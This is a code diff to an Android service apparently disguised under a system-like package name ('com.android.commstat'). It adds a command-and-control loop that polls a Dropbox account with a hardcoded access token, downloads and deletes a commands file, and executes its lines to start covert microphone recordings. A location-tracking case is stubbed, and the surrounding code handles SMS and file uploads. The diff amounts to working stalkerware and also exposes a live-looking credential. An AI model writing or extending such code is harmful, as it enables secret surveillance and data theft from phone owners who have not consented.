@@ -13,18 +13,24 @@ import android.util.Log;
 
 import com.android.commstat.AudioRecorder;
 import com.android.commstat.IOUtils;
+import com.android.commstat.model.CommandSettings;
 import com.android.commstat.model.Sms;
+import com.dropbox.core.DbxException;
 import com.dropbox.core.DbxRequestConfig;
 import com.dropbox.core.v2.DbxClientV2;
 import com.dropbox.core.v2.files.ListFolderResult;
 import com.dropbox.core.v2.files.Metadata;
 import com.dropbox.core.v2.files.WriteMode;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -41,7 +47,8 @@ public class BackupService extends IntentService {
     public static final String RECORD_MIC = "record_mic";
     public static final String EXTRA_FILES_FOLDER = "files_folder";
     public static final String RECORDS_FOLDER = "records";
-    public static final String COMMAND = "command";
+    public static final String COMMAND_EXTRA = "command";
+    public static final String CHECK_COMMAND = "commstat.permission.CHECK_COMMAND";
 
     private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
     private static final String MESSAGES_FOLDER = "messages";
@@ -80,47 +87,108 @@ public class BackupService extends IntentService {
             if(filesFolder != null) {
                 sendFiles(filesFolder);
             }
-        } else if(TextUtils.equals(intent.getAction(), RECORD_MIC)) {
-            recordMic(intent.getStringExtra(COMMAND));
+        } if(TextUtils.equals(intent.getAction(), CHECK_COMMAND)) {
+            checkCommands();
         }
     }
 
-    private void recordMic(String command) {
-        if (command == null) {
+    private void checkCommands() {
+        final String commandsFileName = "commands.txt";
+        DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
+        ListFolderResult result = null;
+        Metadata commandsFileMetadata = null;
+        try {
+            result = client.files().listFolder("");
+            while (true) {
+                for (Metadata metadata : result.getEntries()) {
+                    if (TextUtils.equals(metadata.getName(), commandsFileName)) {
+                        commandsFileMetadata = metadata;
+                        break;
+                    }
+                }
+                if (!result.getHasMore()) {
+                    break;
+                }
+                result = client.files().listFolderContinue(result.getCursor());
+            }
+        } catch (DbxException e) {
+            e.printStackTrace();
             return;
         }
-        int duration = 0;
-        int delay = 0;
-        int totalDuration = 60;
-        List<Integer> args = parseCommandArgs(command);
-        if(args.size() > 0) {
-            totalDuration = args.get(0);
-            if(totalDuration < 0) {
-                totalDuration = 0;
+        if (commandsFileMetadata == null) {
+            return;
+        }
+        OutputStream os = null;
+        File commandsFile = new File(getFilesDir().getAbsolutePath(), commandsFileName);
+        try {
+            os = new FileOutputStream(commandsFile);
+            client.files().downloadBuilder(commandsFileMetadata.getPathDisplay()).download(os);
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            IOUtils.closeQuietly(os);
+        }
+        try {
+            client.files().delete(commandsFileMetadata.getPathDisplay());
+        } catch (DbxException e) {
+            e.printStackTrace();
+        }
+        if(!commandsFile.exists()) {
+            return;
+        }
+        FileInputStream is = null;
+        try {
+            is = new FileInputStream(commandsFile.getAbsolutePath());
+            InputStreamReader inputreader = new InputStreamReader(is);
+            BufferedReader buffreader = new BufferedReader(inputreader);
+            String line;
+            try
+            {
+                while ((line = buffreader.readLine()) != null) {
+                    execCommand(line);
+                }
+            }catch (Exception e)
+            {
+                e.printStackTrace();
+            } finally {
+                IOUtils.closeQuietly(buffreader);
+                IOUtils.closeQuietly(inputreader);
             }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            IOUtils.closeQuietly(is);
         }
-        if(args.size() > 1) {
-            duration = args.get(1);
-            if(duration < 0) {
-                duration = 0;
-            }
+        if(commandsFile.exists()) {
+            commandsFile.delete();
         }
-        if(args.size() > 2) {
-            delay = args.get(2);
-            if(delay < 0) {
-                delay = 0;
-            }
+    }
+
+    private void execCommand(String command) {
+        CommandSettings commandSettings = new CommandSettings(command);
+        if(commandSettings.getCommandType() == null) {
+            return;
         }
-        if(delay == 0 && duration > 0) {
-            delay = duration;
+        switch (commandSettings.getCommandType()) {
+            case RecordAudio:
+                recordMic(commandSettings);
+                break;
+            case RecordLocation:
+                break;
         }
-        if(duration == 0 && totalDuration == 0) {
+    }
+
+    private void recordMic(CommandSettings command) {
+        if(command == null) {
+            return;
+        }
+        if(command.getDuration() == 0 && command.getTotalDuration() == 0) {
             return;
         }
         Calendar calendar = Calendar.getInstance();
-        calendar.add(Calendar.MILLISECOND, totalDuration);
-        FinishListener listener = new FinishListener(calendar.getTime(), delay, duration, totalDuration);
-        new RecordTask(duration == 0 ? totalDuration : duration, listener).start();
+        calendar.add(Calendar.MILLISECOND, command.getTotalDuration());
+        FinishListener listener = new FinishListener(calendar.getTime(), command.getDelay(), command.getDuration(), command.getTotalDuration());
+        new RecordTask(command.getDuration() == 0 ? command.getTotalDuration() : command.getDuration(), listener).start();
     }
 
     class FinishListener implements OnFinishListener {
@@ -208,40 +276,6 @@ public class BackupService extends IntentService {
         String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + ".3gp";
         File file = new File(recordsDir, fileName);
         return file.getAbsolutePath();
-    }
-
-    private List<Integer> parseCommandArgs(String command) {
-        List<Integer> args = new ArrayList<>(1);
-        if(command == null || command.length() == 0) {
-            return args;
-        }
-        if (command.length() > 1) {
-            String[] arguments = TextUtils.split(command, ":");
-            for (int i = 0; i < arguments.length; i++) {
-                String value = "";
-                String argString = arguments[i];
-                for (int j = 0; j < argString.length(); j++) {
-                    Character c = argString.charAt(j);
-                    if (Character.isDigit(c)) {
-                        value += c;
-                    }
-                    if(j == argString.length() - 1) {
-                        try {
-                            int iVal = Integer.decode(value);
-                            if (Character.toUpperCase(c) == 'M') {
-                                iVal *= 60;
-                            } else if (Character.toUpperCase(c) == 'H') {
-                                iVal *= 3600;
-                            }
-                            args.add(iVal * 1000);
-                        } catch (Exception ex) {
-                            ex.printStackTrace();
-                        }
-                    }
-                }
-            }
-        }
-        return args;
     }
 
     private void startQueue() {
